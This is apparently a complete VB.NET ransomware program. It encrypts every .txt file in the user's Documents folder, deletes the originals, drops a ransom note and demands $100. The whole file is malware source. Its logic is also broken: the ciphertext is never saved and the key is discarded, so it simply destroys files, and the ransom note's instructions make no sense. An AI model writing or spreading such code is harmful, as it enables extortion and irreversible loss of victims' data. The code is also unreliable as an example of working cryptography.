Imports System
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Module Ransomware
    Const EncryptionKeySize As Integer = 256
    Const BlockSize As Integer = 128
    Const SaltSize As Integer = 128
    Const Iterations As Integer = 10000
    Const RansomAmount As Double = 100.0

    Sub Main()
        Dim encryptionKey As Byte() = GenerateEncryptionKey()
        Dim publicKey As String = GeneratePublicKey()

        Dim filesToEncrypt As String() = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.txt", SearchOption.AllDirectories)

        For Each file As String In filesToEncrypt
            Dim encryptedFile As String = EncryptFile(file, encryptionKey)
            File.Delete(file)
        Next

        Dim ransomNote As String = GenerateRansomNote(publicKey)
        File.WriteAllText("RansomNote.txt", ransomNote)

        Console.WriteLine("All your files have been encrypted! Pay the ransom amount of $" & RansomAmount & " to receive your files back.")
        Console.ReadLine()
    End Sub

    Function GenerateEncryptionKey() As Byte()
        Using aes As Aes = Aes.Create()
            aes.KeySize = EncryptionKeySize
            aes.BlockSize = BlockSize
            Return aes.Key
        End Using
    End Function

    Function GeneratePublicKey() As String
        Using rsa As RSA = RSA.Create()
            Return rsa.ToXmlString(False)
        End Using
    End Function

    Function EncryptFile(filePath As String, encryptionKey As Byte()) As String
        Dim salt As Byte() = GenerateSalt()
        Dim iv As Byte() = GenerateIV()

        Using aes As Aes = Aes.Create()
            aes.KeySize = EncryptionKeySize
            aes.BlockSize = BlockSize
            aes.Key = encryptionKey
            aes.IV = iv

            Using encryptor As ICryptoTransform = aes.CreateEncryptor()
                Using memoryStream As MemoryStream = New MemoryStream()
                    Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write)
                        Using fileStream As FileStream = File.OpenRead(filePath)
                            fileStream.CopyTo(cryptoStream)
                        End Using

                        cryptoStream.FlushFinalBlock()

                        Dim encryptedBytes As Byte() = memoryStream.ToArray()
                        Dim result As Byte() = New Byte(salt.Length + iv.Length + encryptedBytes.Length - 1) {}
                        Buffer.BlockCopy(salt, 0, result, 0, salt.Length)
                        Buffer.BlockCopy(iv, 0, result, salt.Length, iv.Length)
                        Buffer.BlockCopy(encryptedBytes, 0, result, salt.Length + iv.Length, encryptedBytes.Length)
                        Return Convert.ToBase64String(result)
                    End Using
                End Using
            End Using
        End Using
    End Function

    Function GenerateSalt() As Byte()
        Using random As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
            Dim salt As Byte() = New Byte(SaltSize \ 8 - 1) {}
            random.GetBytes(salt)
            Return salt
        End Using
    End Function

    Function GenerateIV() As Byte()
        Using random As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
            Dim iv As Byte() = New Byte(BlockSize \ 8 - 1) {}
            random.GetBytes(iv)
            Return iv
        End Using
    End Function

    Function GenerateRansomNote(publicKey As String) As String
        Return String.Format("Your files have been encrypted with AES-256 encryption. To decrypt them, send {0} to the following address: {1}. The ransom amount is ${2}.", publicKey, "example@example.com", RansomAmount)
    End Function
End Module